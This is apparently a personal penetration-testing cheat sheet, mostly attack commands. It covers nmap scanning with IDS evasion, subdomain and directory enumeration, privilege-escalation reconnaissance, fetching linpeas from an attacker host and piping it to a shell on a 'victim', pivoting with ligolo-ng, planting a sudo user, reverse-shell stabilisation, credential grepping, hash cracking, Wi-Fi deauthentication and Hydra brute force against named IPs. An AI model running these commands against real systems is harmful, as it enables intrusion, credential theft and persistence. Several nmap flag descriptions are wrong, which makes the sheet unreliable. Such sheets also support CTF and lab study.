# NMAP:

# Host Discovery

 1. nmap -sP -PE -PP -PA -PU target_ip_address (or nmap -sn -PE -sM -sO target_ip_address): Perform a ping scan (ICMP) to identify live hosts, followed by TCP SYN, UDP, and ICMP echo requests.
2. nmap -n -sL -iL target_ip_address: List hosts in a file (-iL) or specify a network (-n) and perform a scan.
# Port Scanning

1. nmap -p 1-1000 target_ip_address: Scan ports 1 to 1000.
2. nmap -p- target_ip_address: Scan all ports (1-65535).
3. nmap -sT -p [port list] target_ip_address: Perform a TCP SYN scan on specific ports.
4. nmap -sU -p [port list] target_ip_address: Perform a UDP scan on specific ports.
# OS Detection and Version

1. nmap -O target_ip_address: Perform OS detection and version scan.
2. nmap -sV target_ip_address: Perform version scan for services.
# Firewall and IDS Evasion

1. nmap -f -T3 -D 192.168.1.101,192.168.1.102 target_ip_address: Use fragmentation (-f) and parallel processing (-D) to evade firewalls and IDS systems.
# Scripting and Customization

1. nmap -script=<script_name> target_ip_address: Run a custom NSE (Nmap Scripting Engine) script.
2. nmap --script-args=<arguments> target_ip_address: Pass arguments to NSE scripts.
 # Additional Flags and Options

1. nmap -Pn: Disable ping scanning.
2. nmap --data-length 200: Set the maximum packet size.
3. nmap --scan-delay 1d: Set the delay between scan packets.
4. nmap --mac-parallelism 1: Specify the number of parallel MAC address scans.
# Real-World Examples

1. nmap -A -T3 -sT -p 80,443 target_ip_address: Perform a comprehensive scan, including OS detection, version scan, and TCP SYN scan on ports 80 and 443.
2. nmap -sn -PU -p 22 target_ip_address: Perform a UDP scan on port 22 and list hosts in a file (-sn).

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Apache server:
1. sudo systemctl start apache2
2. sudo systemctl stop apache2
3. sudo systemctl restart apache2
4. enable systemctl apache2
5. sudo nano /etc/apache2/apache2.conf (apache config file to change port and other things)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------


## Gobuster subdomain Enumeration:

1. gobuster vhost -u example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 4 --append-domain
2. gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains=top1million-5000.txt -t 10 
_____________________________________________________________________________________________________________________________________________________________________________
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Dirsearch directory find:

1.dirsearch -u http://url.com/ -e*
2.gobuster dir -u http://url.com/ -w wordlist -t 10

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Host file direct entry:
1.locate *.nse | grep <servicename> 

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation common Commands:
whoami
ls -la
uname -a
cat /proc/version
id 
history
sudo -l
cat /etc/crontab
find / -perm -u=s -type f 2>/dev/null
netstat -tuln
getcap -r / 2>/dev/null
filecap

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Linepeas Installation on Target with and without internet
# From github:
# From github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Without curl
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# ligolo-ng port forwarding tool commands:
    sudo ip tuntap add user root mode tun ligolo
    sudo ip link set ligolo up
     ./proxy -selfcert (for hacking ctf machines)
     ./proxy -autocert (for real world)
     ./agent -connect 10.10.16.35:11601 -ignore-cert (target machine use this command)
    session (choose session or simply press senter)
    start (use this command in ligolo)
    sudo ip route add 240.0.0.1/32 dev ligolo (to route the local running services to our machine magic ip)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Port Forwarding using SSH
    ssh -L 8888:localhost:8080 karthik@34.44.2.255 (with password)
     ssh -i private_key -L 8888:localhost:8080 username@targetip (with private key)
      (above syntax -L 8888(our machine port):localhost:8080(target machine localhost and ip to forward)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
   
# for adding a new user:
sudo adduser spyagent
sudo usermod -aG sudo spyagent
nano /etc/sudoers    #(adding user to sudoers file to get su permission)
usrname  ALL=(ALL:ALL) ALL

----------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Stabilizing the reverse shell:
  1. script /dev/null -c /bin/bash
   2. CTRL + Z
   3. stty raw -echo; fg
   4. Then press Enter twice, and then enter:
   5. export TERM=xterm

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Converting ova to vmdk and other extensions:

   zip archive.zip file1 file2 directory1
    unzip archive.zip (to extract .zip)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------
#  tar compression
 tar -cvf archive.tar file1 file2 directory1
  tar -cvzf archive.tar.gz file1 file2 directory1
  tar -cvjf archive.tar.bz2 file1 file2 directory1
  tar -cvJf archive.tar.xz file1 file2 directory1

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# tar -xvf archive.tar
tar -xzvf archive.tar.gz
tar -xjvf archive.tar.bz2
tar -xJvf archive.tar.xz

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # gzip
gzip file.txt
gunzip file.txt.gz (to extract .gz)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# bzip2
bzip2 file.txt
bunzip2 file.txt.bz2 (to extract .bz2)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# xz file.txt
xz file.txt
unxz file.txt.xz (to extract .xz)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 7z
7z a archive.7z file1 file2 directory1
7za x archive.7z (to extract .7z)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# rar
rar a archive.rar file1 file2 directory1
unrar x archive.rar  (to extract .rar)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Grep filtering commands
 grep -oP '(?<=^| )([0-9]{1,3}\.){3}[0-9]{1,3}(?= |$)'| sort | uniq  (filter ipaddress)
 grep -Ev '^\s*https?://|.{41,}|^\s*$' | grep -E '[a-z0-9!@#$%^&*()-_=+{};:,.<>?]{5,}:[a-z0-9!@#$%^&*()-_=+{};:,.<>?]{5,}' | grep -v -e 'http://' -e 'https://' (filter credentails)
 grep -ril 'username' /var/www/html (will show the files contains username)
find /var/www/html -type f -name "*.php" -exec grep -l 'username' {} + | xargs grep -l 'password'

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# John The Ripper (basic Format)
1. john -w=<wordlist> hash.txt
2. john --format=raw-md5 --wordlist=<wordlist> <hash_file>
3. john --format=bcrypt --wordlist=<wordlist> <hash_file>
4. john --format=raw-sha1 --wordlist=<wordlist> <hash_file>
5. john --format=raw-sha256 --wordlist=<wordlist> <hash_file>

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # hashcat (basic format)
hashcat -m 0 -a 0 <hash_file> <wordlist>  (md5 hashes)
hashcat -m 3200 -a 0 <hash_file> <wordlist> (bcrypt hashes)
hashcat -m 100 -a 0 <hash_file> <wordlist> (sha1 hashes)
hashcat -m 1400 -a 0 <hash_file> <wordlist> (sha 256 hashes)

-------------------------------------------------------------------------------------------------------------------------------------
# FTP server:
apt install vsftpd
systemctl start vsftpd
systemctl enable vsftpd
systemctl status vsftpd

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# wireless hacking
 1. sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
  2. sudo airodump-ng wlan0mon #(Start capturing traffic:)
 3. sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
4. sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
_____________________________________________________________________________________________________________________________________________________________________________________________
# Crack the handshake:
sudo aircrack-ng -w wordlist.txt -b [BSSID] outputfile.cap 
aircrack-ng outputfile.cap #(Identify Handshake or get bssid)
aircrack-ng -w wordlist.txt outputfile.cap #(direct crack)
________________________________________________________________________________________________________________________________________________________________________________________________
# Hydra all brute force commands:
1. note "-P" capital for passwordlists if it is only single password use small "-p"
2. hydra -l <username> -P <passwords_file> <target_ip> ssh
3. hydra -l <username> -P <passwords_file> <target_ip> ftp
4. hydra -l <username> -P <passwords_file> <target_ip> mysql
5. hydra -l <username> -p <password> <ip> <service> -s <port>
6. hydra -V -f -P '/home/kali/rockyou.txt'  10.10.7.91 vnc (without username)
7. hydra -C <combinations.txt> <ip> <service>
8. hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
9. hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
10. hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
11. hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
_____________________________________________________________________________________________________________________________________________________________________________________________________

# wireshark packet filters:
Protocol Filters:
tcp: Filters TCP traffic.
udp: Filters UDP traffic.
icmp: Filters ICMP traffic.
http: Filters HTTP traffic.
dns: Filters DNS traffic.
arp: Filters ARP traffic.
smtp: Filters SMTP traffic.
ftp: Filters FTP traffic.
ssl: Filters SSL/TLS traffic.
ssh: Filters SSH traffic.

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Address Filters:
ip.addr == x.x.x.x: Filters traffic for a specific IP address
ip.src == x.x.x.x: Filters traffic with a specific source IP address.
ip.dst == x.x.x.x: Filters traffic with a specific destination IP address.
eth.addr == xx:xx:xx:xx:xx:xx: Filters traffic based on MAC address.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  
  
  
  
